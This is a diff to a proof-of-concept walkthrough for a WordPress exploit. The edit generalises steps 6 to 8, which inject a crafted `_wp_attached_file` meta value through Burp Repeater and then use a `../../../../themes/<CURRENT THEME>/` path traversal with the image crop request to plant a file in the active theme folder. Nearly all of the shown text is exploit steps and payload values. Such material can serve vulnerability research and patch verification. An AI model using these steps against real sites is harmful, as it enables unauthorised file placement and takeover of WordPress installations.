@@ -73,7 +73,7 @@ action=image-editor&_ajax_nonce=0fc4799ff5&postid=6&history=%5B%7B%22c%22%3A%7B%
 ```
 
 #### 6. Update attached file to `poc.jpg#/poc.jpg`
-* Add `&meta_input[_wp_attached_file]=2019/02/poc.jpg#/poc.jpg` in the POST request `/wp-admin/post.php` captured in step 4 in Burp Repeater similar as below and then click `Go`.
+* Add `&meta_input[_wp_attached_file]=<CURRENT YEAT>/<CURRENT MONTH>/poc.jpg#/poc.jpg` (e.g. `&meta_input[_wp_attached_file]=2019/02/poc.jpg#/poc.jpg` for February, 2019) in the POST request `/wp-admin/post.php` captured in step 4 in Burp Repeater similar as below and then click `Go`.
 
 ```
 POST /wp-admin/post.php HTTP/1.1
@@ -95,8 +95,8 @@ _wpnonce=ab3340b93c&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D6%26action%
 #### 7. Crop the image
 * Repeat the POST request `/wp-admin/admin-ajax.php` captured in step 5 in Burp Repeater.
 
-#### 8. Update attached file to `poc.jpg#/../../../../themes/<current theme>/poc.jpg`
-* Update as  `&meta_input[_wp_attached_file]=2019/02/poc.jpg#/../../../../themes/twentyseventeen/poc.jpg` in the POST request `/wp-admin/post.php` captured in step 4 in Burp Repeater similar as below and click `Go`.
+#### 8. Update attached file to `poc.jpg#/../../../../themes/<CURRENT THEME>/poc.jpg`
+* Update as  `&meta_input[_wp_attached_file]=<CURRENT YEAR>/<CURRENT MONTH>/poc.jpg#/../../../../themes/<CURRENT THEME>/poc.jpg` (e.g. `&meta_input[_wp_attached_file]=2019/02/poc.jpg#/../../../../themes/twentyseventeen/poc.jpg` for February, 2019) in the POST request `/wp-admin/post.php` captured in step 4 in Burp Repeater similar as below and click `Go`.
 
 ```
 POST /wp-admin/post.php HTTP/1.1
